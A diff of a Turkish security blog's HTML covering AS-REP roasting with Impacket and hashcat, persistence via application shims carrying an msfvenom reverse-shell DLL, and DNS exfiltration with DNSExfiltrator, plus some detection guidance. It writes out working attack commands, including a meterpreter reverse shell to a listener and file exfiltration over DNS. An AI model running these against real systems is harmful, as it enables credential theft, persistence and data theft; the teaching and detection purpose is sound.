-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;searchBase=&amp;quot;DC=EXAMPLE,DC=COM&amp;quot; filer=&amp;quot;(&amp;amp;amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;quot; scope=&amp;quot;SUBTREE&amp;quot; timeLimit=&amp;quot;0&amp;quot; countLimit=&amp;quot;1000&amp;quot; aliasesDereferencingMethod=&amp;quot;ALWAYS&amp;quot; referralsHandlingMethod=&amp;quot;IGNORE&amp;quot;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;searchBase=&amp;quot;DC=EXAMPLE,DC=COM&amp;quot; filer=&amp;quot;(&amp;amp;amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;quot; scope=&amp;quot;SUBTREE&amp;quot; timeLimit=&amp;quot;0&amp;quot; countLimit=&amp;quot;1000&amp;quot; aliasesDereferencingMethod=&amp;quot;ALWAYS&amp;quot; referralsHandlingMethod=&amp;quot;IGNORE&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h1&gt;AS-REP Roasting Nedir&lt;/h1&gt;
 &lt;p&gt;AD üzerinde eski versiyonlara yönelik uyumluluk veya ihtiyaçlar sebebiyle bilerek açılmış olan &lt;code&gt;Do not require Kerberos Pre Authentication&lt;/code&gt; seçeneğine sahip kullanıcılara ait RC4 keylerinin direkt olarak KDC üzerinden çekilmesi ve sistemler üzerinde Brute Force dair herhangi bir iz bırakmadan &lt;code&gt;hashcat&lt;/code&gt; veya &lt;code&gt;john&lt;/code&gt; gibi parola kırma araçları ile offline olarak bu parolanın kırılmasına verilen isimdir.&lt;/p&gt;
@@ -67,9 +191,8 @@ LDAP:&lt;/p&gt;
 &lt;/ul&gt;
 &lt;p&gt;Öncelikle bizim bu saldırı vektörünü yapabilmemiz için bir kullanıcı listesine ihtiyacımız var. Bu sebeple bir dosya yaratıp ben içerisinde 2-3 tane user ekliyorum. Ekliyorum çünkü neden olmasın? Evet bu kadar. Saldırı vektörümüzü çalıştırmaya hazırız. Bunun için aşağıdaki gibi bir komut yeterli olacaktır.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Impacket examples içerisinde bulabilirsiniz&lt;/strong&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python3 GetNPUsers.py windomain.local -usersfile usernames.txt -format hashcat -outputfile hash.asrep
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;python3 GetNPUsers.py windomain.local -usersfile usernames.txt -format hashcat -outputfile hash.asrep&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Aşağıda ekran görüntüsünde göreceğiniz üzere bazılarında hata aldık çünkü Kerberos DB üzerinde ilgili kullanıcıları bulamadı fakat bizim 3 tane kullanıcımız vardı. Bize 2 tane hata çıkartılmış o sebeple diyebiliriz ki 1  tanesine ait hash'i elde ettik.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="IMpacket As-REP" src="images/asrepimpacket.png"&gt;&lt;/p&gt;
@@ -78,9 +201,8 @@ LDAP:&lt;/p&gt;
 &lt;p&gt;Evet &lt;code&gt;Impacket&lt;/code&gt; ile yaptığımız saldırı sonucunda elimizde bir hashimiz var ve bu hashi kırmak için elimizde tam da ona uygun çıktısıyla bir araç var ismi &lt;code&gt;hashcat&lt;/code&gt;. Kendisi ile ilgili bir çok yazı bulabilirsiniz. AS-REP isteğimiz sonucu dönen değeri kırabilmek için kendisi üzerinde öntanımlı bir hash tipi ve ID'si bulunmaktadır.&lt;/p&gt;
 &lt;p&gt;Hashcat üzerinde 18200 ID'li hash tipi ile kırabilirsiniz.
 &lt;code&gt;.\hashcat.exe --help | findstr 18200&lt;/code&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Normal AS-REP ve zararlı AS-REP trafiğini görebileceğiniz network trafiğine ait PCAP dosyasını aşağıdan indirebilirsiniz.&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://drive.google.com/file/d/1AYdLDlWcImlNxXia4ptu17jxOvZJIFZF/view?usp=sharing"&gt;AS-REP PCAP&lt;/a&gt;&lt;/p&gt;
@@ -130,9 +252,8 @@ LDAP:&lt;/p&gt;
 &lt;h2&gt;Uygun bir DLL Dosyası Hazırlamak&lt;/h2&gt;
 &lt;p&gt;Burada siz isterseniz kendinize özel bir DLL dosyası hazırlayabilirsiniz fakat okuduğum örnekte bu DLL dosyası Reverse Shell almak için kullanılmaktadır. &lt;/p&gt;
 &lt;p&gt;MSFVenom ile DLL Dosya formatında Reverse Shell oluşturmak için&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom -p windows/meterpreter/reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.1 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt; -f dll &amp;gt; pentestlab.dll
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.1 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt; -f dll &amp;gt; pentestlab.dll
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h2&gt;Arayüz ile Herhangi bir Uygulamaya DLL'i Enjekte Etmek&lt;/h2&gt;
 &lt;p&gt;Bunun için Windows'un bize sunmuş olduğu ADK Toolkit uygulamasını açıyoruz ve burada sol sütundan Custom databases altında yeni bir database oluşturuyoruz. &lt;/p&gt;
@@ -145,17 +266,15 @@ LDAP:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Options for InjectDLL" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-inject-dll-options.png"&gt;&lt;/p&gt;
 &lt;p&gt;İşte bu kadar tüm işlemler tamamlandıktan sonra artık bir &lt;code&gt;sdb&lt;/code&gt; dosyasına sahibiz. Buradan sonraki kısım ise bu &lt;code&gt;sdb&lt;/code&gt; dosyasını sisteme eklemek.&lt;/p&gt;
 &lt;p&gt;Bunun için &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sdbinst olusturdugunuzsdb.sdb
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sdbinst olusturdugunuzsdb.sdb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img alt="SDB Install" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-installed.png"&gt;&lt;/p&gt;
 &lt;p&gt;Evet artık her şeyimiz tamamlandı, sistem yöneticimiz ne zaman Putty'yi açarsa bize Reverse Shell düşecektir. Metasploit üzerinde Multi handler açıp sürekli dinleyerek nurtopu gibi bir meterpreter shell'e sahip olabilirsiniz. &lt;/p&gt;
 &lt;h2&gt;Arayüz Olmadan Enjekte Etmek&lt;/h2&gt;
 &lt;p&gt;Bunun için CLI üzerinden aşağıdaki komutunu girmeniz yeterli olacaktır.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sdb-explorer.exe -r pentestlab.sdb -a istediginiz.exe
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;sdb-explorer.exe -r pentestlab.sdb -a istediginiz.exe&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Tabi burada illa kurulu bir uygulama olmasına gerek yok isterseniz Windows sistem üzerinde çalışan herhangi bir exe'ye de bunu enjekte edebilirsiniz. Okuduğum makale örneğinde &lt;code&gt;spoolsv.exe&lt;/code&gt; dosyasına enjekte edilmiştir.&lt;/p&gt;
 &lt;h2&gt;Peki Her Şey Güzel Biz Bu İşlem Olduğunda Anlayabilir Miyiz?&lt;/h2&gt;
@@ -163,25 +282,22 @@ LDAP:&lt;/p&gt;
 Uzun cevap:&lt;/p&gt;
 &lt;p&gt;Oluşturulan bu SDB dosyalarına ait kayıtlar Windows sistemler altında AppPatch klasörü altında tutulmaktadır. &lt;/p&gt;
 &lt;p&gt;Bu klasöre ulaşmak için: &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;%WINDIR%\AppPatch\custom&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;%WINDIR%\AppPatch\custom&lt;/span&gt;
 &lt;span class="c"&gt;%WINDIR%\AppPatch\AppPatch64\Custom&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Ha bunun yerine isterseniz Process Explorer içerisinde de kaybolabilirsiniz.&lt;/p&gt;
 &lt;h2&gt;Tespit etmek&lt;/h2&gt;
 &lt;p&gt;Registry değişikliklerini veya dosya konumlarını izlemek bunun için bir yöntemdir. Takip edilecek Registry ve dosya konumları aşağıda verilmiştir. Oluşturulacak yeni bir key SysMon üzerinde &lt;code&gt;12&lt;/code&gt; event ID ile tetiklenecektir. &lt;/p&gt;
 &lt;p&gt;Registry konumları:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\
-HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\&lt;/span&gt;
+&lt;span class="err"&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Dosya konumu:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;%WINDIR%\AppPatch\custom&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;%WINDIR%\AppPatch\custom&lt;/span&gt;
 &lt;span class="c"&gt;%WINDIR%\AppPatch\AppPatch64\Custom&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Daha detaylı bir bilgi almak için Sean Price'ın &lt;a href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims.pdf"&gt;sunumunu&lt;/a&gt; kullanabilirsiniz.&lt;/p&gt;
 &lt;p&gt;Okuduğum yazı:
@@ -232,11 +348,10 @@ Nedir DNS'in çalışma mantığı?&lt;/p&gt;
 &lt;p&gt;Server üzerinde 
 &lt;code&gt;dnsexfiltrator.py -d domain -p PAROLA&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Client üzerinde&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;c:\DNSExfiltrator&amp;gt; powershell
-PS c:\DNSExfiltrator&amp;gt; Import-Module .\Invoke-DNSExfiltrator.ps1
-PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;c:\DNSExfiltrator&amp;gt; powershell&lt;/span&gt;
+&lt;span class="err"&gt;PS c:\DNSExfiltrator&amp;gt; Import-Module .\Invoke-DNSExfiltrator.ps1&lt;/span&gt;
+&lt;span class="err"&gt;PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;ul&gt;
 &lt;li&gt;-i argümanı ile göndermek istediğiniz dosya &lt;/li&gt;
